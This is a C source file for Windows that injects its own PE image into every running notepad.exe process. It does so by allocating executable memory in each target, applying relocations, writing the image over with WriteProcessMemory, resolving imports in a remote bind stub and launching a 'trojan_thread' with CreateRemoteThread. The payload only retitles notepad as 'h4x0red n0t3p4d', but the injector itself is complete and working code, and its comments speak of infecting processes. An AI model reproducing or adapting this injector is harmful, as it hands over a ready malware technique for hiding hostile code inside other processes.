#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#define PAGE_SIZE 4096

/* Structure of the comms page, passed as thread parameter to remote thread */
struct inject_img {
	void *base;
	size_t img_sz;
	void *reloc;
	size_t reloc_sz;
	void *idata;
	size_t idata_sz;
	DWORD (*entry)(void *param);
};

/* Headers handed back from PE parsing in get_pe_img() */
struct pe_img {
	void *img_map;
	size_t img_size;
	PIMAGE_DOS_HEADER h_dos;
	PIMAGE_NT_HEADERS h_nt;
	PIMAGE_SECTION_HEADER h_sec;
};

/* PE reloc block header */
struct reloc_block {
	uint32_t pg_rva;
	uint32_t block_sz;
};

/* PE import table header */
struct idata_entry {
	uint32_t ilt_rva;
	uint32_t timestamp;
	uint32_t forwarder_idx;
	uint32_t name_rva;
	uint32_t iat_rva;
};

/* Print a nice Windows(r) error message */
static const char *err_str(void)
{
	static char buf[2048];
	if ( FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
			GetLastError(), 0,
			buf, sizeof(buf), NULL) )
		return buf;
	return "Unknown error";
}

static BOOL wcb(HWND h, LPARAM param)
{
	DWORD pid;

	if ( param == 0 ) {
		GetWindowThreadProcessId(h, &pid);
		if ( pid != GetCurrentProcessId() )
			return TRUE;
		SendMessage(h, WM_SETTEXT, FALSE, "h4x0red n0t3p4d");
		EnumChildWindows(h, wcb, 1);
		return FALSE;
	}

	SendMessage(h, WM_SETTEXT, FALSE, "Hello World!\r\n");

	return TRUE;
}

/* This is basically our remote threads entry point, no restrictions apply from
 * here on in... Param points to the comms page
 */
static DWORD trojan_thread(void *param)
{
	//struct inject_img *inj = param;
	EnumWindows(wcb, 0);
	return 1;
}

/* This is the real (pre-)entry point which finishes off DLL binding, which cannot be done remotely.
 * we can only call to code which doesn't need to use any imported functions that aren't in
 * kernel32.dll - ie. no calls to printf, strcmp of whatever
 */
DWORD __attribute__((dllexport)) bind_stub(void *env_page)
{
	struct inject_img *inj = env_page;
	struct idata_entry *i;
	void *end = inj->idata + inj->idata_sz;

	for(i = inj->idata; &i[1] <= end; i++) {
		uint32_t *o, *n;
		HMODULE mod;

		if ( i->ilt_rva == 0 )
			break;
	
		//if ( !strcasecmp(base + i->name_rva, "KERNEL32.dll") )
		//	continue;

		//printf("Stub-bind DLL: %s\n", inj->base + i->name_rva);
		//printf(" timestamp = 0x%.8x\n", i->timestamp);
		//printf(" forwarder_idx = %u\n", i->forwarder_idx);

		mod = LoadLibrary(inj->base + i->name_rva);
		if ( mod == NULL ) {
			//fprintf(stderr, "LoadLibrary: %s\n", err_str());
			return 666;
		}

		n = inj->base + i->iat_rva;
		for(o = inj->base + i->ilt_rva; *o; o++, n++) {
			if ( *o & 0x80000000 ) {
				//printf(" -> Ord: %u\n", inj->base + (*o & 0xffff));
				return 667;
			}else{
				uint32_t addr;

				addr = GetProcAddress(mod, inj->base + *o + 2);
				if ( addr == NULL ) {
					//fprintf(stderr, "GetProcAddr: %s: %s\n",
					//	inj->base + *o + 2,
					//	err_str());
					return 668;
				}

				//printf(" -> %s (0x%.8x)\n", inj->base + *o + 2, addr);
				*n = addr;
			}
		}
	}

	/* TODO: inline asm for SEH wrapper, in case something goes wrong */

	/* The image is fully bound, time to call the real entry point */
	if ( CreateThread(NULL, 0, inj->entry, env_page, 0, NULL) == NULL )
		return 0;

	/* Caller waits for us to make sure bind went OK */
	return 1;
}

/* Map a PE image and find the headers filling in a self_img structure */
static int get_pe_img(struct pe_img *si, void *base)
{
	si->img_map = base;
	si->h_dos = si->img_map;
	si->h_nt = si->img_map + si->h_dos->e_lfanew;
	si->h_sec = (void *)&si->h_nt->OptionalHeader + si->h_nt->FileHeader.SizeOfOptionalHeader;
	return 1;
}

/* Relocate the image given a base offset */
static int relocate(void *base, void *reloc, size_t reloc_sz, int32_t ofs)
{
	struct reloc_block *rb;
	void *end, *b_end;

	printf("Relocating: %.8x fixup\n", ofs);
	end = reloc + reloc_sz;

	for(rb = reloc; (void *)rb < end; rb = (void *)rb + rb->block_sz) {
		uint16_t *x;
		b_end = (void *)rb + rb->block_sz;
		printf(" .reloc block: %.8x (%u bytes)\n", rb->pg_rva, rb->block_sz);
		for(x = (void *)rb + sizeof(*rb); x < b_end; x++) {
			uint16_t type, addr;
			uint32_t *f;
			type = (*x & 0xf000) >> 12;
			addr = (*x & 0x0fff);

			switch(type) {
			case IMAGE_REL_BASED_HIGHLOW:
				f = (void *)(base + rb->pg_rva + addr);
				//printf("   - RELOC32: %.8x (%.8x -> %.8x)\n",
				//	rb->pg_rva + addr,
				//	*f, *f + ofs);
				*f += ofs;
				break;
			case IMAGE_REL_BASED_ABSOLUTE:
				/* nop */
				break;
			default:
				fprintf(stderr, "Unhandled reloc type: %x\n", type);
				return 0;
			}
		}
	}
	return 1;
}

static int inject_code(DWORD pid, void *base)
{
	HANDLE hp, ht;
	struct pe_img si;
	struct inject_img inj;
	uint32_t new_base, old_base;
	void *reloc_ptr, *idata_ptr;
	size_t reloc_sz, idata_sz;
	void *prep_img;
	unsigned int i;
	size_t written;
	int32_t ofs;
	int ret = 0;
	void *comms_page;
	DWORD thread_ret;

	/* First open the process */
	hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if ( hp == NULL ) {
		fprintf(stderr, "OpenProcess(): %s\n", err_str());
		return 0;
	}

	if ( !get_pe_img(&si, base) )
		goto err_close;

	/* Allocate enough space for the prep image */
	si.img_size = si.h_nt->OptionalHeader.SizeOfImage;
	prep_img = VirtualAlloc(NULL, si.img_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if ( prep_img == NULL ) {
		fprintf(stderr, "VirtualAlloc(): %s\n", err_str());
		goto err_close;
	}

	/* Allocate remote image, get new base address */
	new_base = (uint32_t)VirtualAllocEx(hp, NULL, si.img_size,
				MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if ( new_base == 0 ) {
		fprintf(stderr, "VirtualAllocEx(): %s\n", err_str());
		goto err_free_local;
	}

	old_base = (uint32_t)base;
	ofs = new_base - old_base;

	printf("Rebasing: from %.8x to %.8x\n", old_base, new_base);
	printf("Prep-Image: 0x%.8x\n", (uint32_t)prep_img);
	printf("Image Size: 0x%.8x\n", si.img_size);

	/* Copy section data in to prep image */
	for(i = 0; i < si.h_nt->FileHeader.NumberOfSections; i++) {
		if ( (si.h_sec[i].Characteristics & 0x2) )
			continue;

		if ( si.h_sec[i].PointerToRawData == 0 ||
			si.h_sec[i].SizeOfRawData == 0 )
			continue;

		printf(" Loading section: %8s (%5u bytes @ 0x%.8x): rva=0x%.8x - 0x%.8x\n",
			si.h_sec[i].Name,
			si.h_sec[i].SizeOfRawData,
			si.h_sec[i].PointerToRawData,
			si.h_sec[i].VirtualAddress,
			si.h_sec[i].VirtualAddress + si.h_sec[i].SizeOfRawData);

		memcpy(prep_img + si.h_sec[i].VirtualAddress,
			si.img_map + si.h_sec[i].VirtualAddress,
			si.h_sec[i].SizeOfRawData);
	}

	/* Copy PE headers */
	memcpy(prep_img, base, PAGE_SIZE);

	/* Use data directory to find RVA of reloc section */
	if ( (si.h_nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) &&
		si.h_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size ) {
		uint32_t rva = 
			si.h_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		reloc_sz = si.h_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
		reloc_ptr = prep_img + rva;
		inj.reloc = (void *)new_base + rva;
		printf("Dir: BaseReloc: %5u bytes @ 0x%.8x\n", reloc_sz, rva);
	}else{
		reloc_sz = 0;
		reloc_ptr = NULL;
		inj.reloc = NULL;
	}

	/* Use data directory to find RVA of idata section */
	if ( (si.h_nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_IMPORT) &&
		si.h_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size ) {
		uint32_t rva =
			si.h_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
		idata_sz = si.h_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
		idata_ptr = prep_img + rva;
		inj.idata = (void *)new_base + rva;
		printf("Dir: Import: %5u bytes @ 0x%.8x\n",
			idata_sz,
			rva);
	}else{
		idata_sz = 0;
		idata_ptr = NULL;
		inj.idata = NULL;
	}

	/* Apply relocations */
	if ( !relocate(prep_img, reloc_ptr, reloc_sz, ofs) )
		goto err_free;

	/* Copy to remote process */
	if ( !WriteProcessMemory(hp, (void *)new_base,
				prep_img, si.img_size, &written) ) {
		fprintf(stderr, "WriteProcessMemory(): %s\n", err_str());
		goto err_free;
	}

	if ( written != si.img_size ) {
		fprintf(stderr, "WriteProcessMemory(): %u/%u written\n",
				written, si.img_size);
		goto err_free;
	}
	/* TODO: Fix-up page access with VirtualProtectEx */
	printf("Copied %u bytes to remote 0x%.8x\n", si.img_size, new_base);

	/* Setup comms page with the inject_img struct */
	inj.base = (void *)new_base;
	inj.entry = trojan_thread + ofs;
	inj.reloc_sz = reloc_sz;
	inj.idata_sz = idata_sz;

	comms_page = VirtualAllocEx(hp, NULL, PAGE_SIZE,
				MEM_COMMIT, PAGE_READWRITE);
	if ( comms_page == NULL ) {
		fprintf(stderr, "VirtualAllocEx(): %s\n", err_str());
		goto err_free;
	}
	if ( !WriteProcessMemory(hp, comms_page, &inj, sizeof(inj), &written) ) {
		fprintf(stderr, "WriteProcessMemory(): %s\n", err_str());
		goto err_free_comm;
	}
	if ( written != sizeof(inj) ) {
		fprintf(stderr, "WriteProcessMemory(): %u/%u written\n",
				written, sizeof(inj));
		goto err_free_comm;
	}
	printf("Copied %u bytes to remote comm page at 0x%.8x\n",
		sizeof(inj), comms_page);

	/* re-base entry point */
	printf("Re-based Bind Stub: bind_stub = 0x%.8x -> 0x%.8x\n",
		bind_stub, bind_stub + ofs);
	printf("Re-based Entry: trojan_thread = 0x%.8x -> 0x%.8x\n",
		trojan_thread, trojan_thread + ofs);

	/* Start remote thread with bind_stub() as entry point */
	ht = CreateRemoteThread(hp, NULL, 0, bind_stub + ofs, comms_page, 0, NULL);
	if ( ht == NULL ) {
		fprintf(stderr, "CreateRemoteThread(): %s\n", err_str());
		goto err_free_comm;
	}

	/* Wait for thread */
	WaitForSingleObject(ht, INFINITE);

	/* Get the thread exit code */
	if ( !GetExitCodeThread(ht, &thread_ret) ) {
		fprintf(stderr, "GetExitCodeThread(): %s\n", err_str());
		goto err_free_comm;
	}

	/* Returns 1 on success, 0 on fail, 666 on bind error */
	if ( thread_ret != 1 ) {
		const char *str;

		switch(thread_ret) {
		case 666:
			str = "DLL failed to load";
			break;
		case 667:
			str = "Ordinal lookups not supported";
			break;
		case 668:
			str = "Symbol not found";
			break;
		default:
			str = "unknown";
			break;
		}
		fprintf(stderr, "Remote Thread FAILED code=%u: %s\n",
			thread_ret, str);
		goto err_free_comm;
	}

	printf("Remote Link + Load: OK\n");

	ret = 1;
	goto err_free_local;

err_free_comm:
	VirtualFreeEx(hp, comms_page, PAGE_SIZE, MEM_RELEASE);
err_free:
	VirtualFreeEx(hp, (void *)new_base, si.img_size, MEM_RELEASE);
err_free_local:
	VirtualFree(prep_img, si.img_size, MEM_RELEASE);
err_close:
	CloseHandle(hp);
	return ret;
}

static unsigned int proliferate(int(*match)(PROCESSENTRY32 *p), void *img)
{
	unsigned int ret = 0;
	HANDLE h;
	PROCESSENTRY32 p;

	h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if ( h == INVALID_HANDLE_VALUE ) {
		fprintf(stderr, "CreateToolHelp32Snapshot(PROC): %s\n", err_str());
		return 0;
	}

	p.dwSize = sizeof(p);

	if ( !Process32First(h, &p) ) {
		fprintf(stderr, "Process32First(): %s\n", err_str());
		goto out_close;
	}

	do {
		if ( !(*match)(&p) )
			continue;
		printf("%s found with pid %lu\n",
			p.szExeFile, p.th32ParentProcessID);
		ret += inject_code(p.th32ProcessID, img);
	}while(Process32Next(h, &p));

out_close:
	CloseHandle(h);
	return ret;
}

static int cbfn(PROCESSENTRY32 *p)
{
	/* Only infect notepad.exe */
	if ( strcasecmp(p->szExeFile, "notepad.exe") )
		return 0;
	return 1;
}

int main(int argc, char **argv)
{
	unsigned int ret;
	ret = proliferate(cbfn, GetModuleHandle(NULL));
	printf("Injected code in to %u processes\n", ret);
	return (ret) ? EXIT_SUCCESS : EXIT_FAILURE;
}
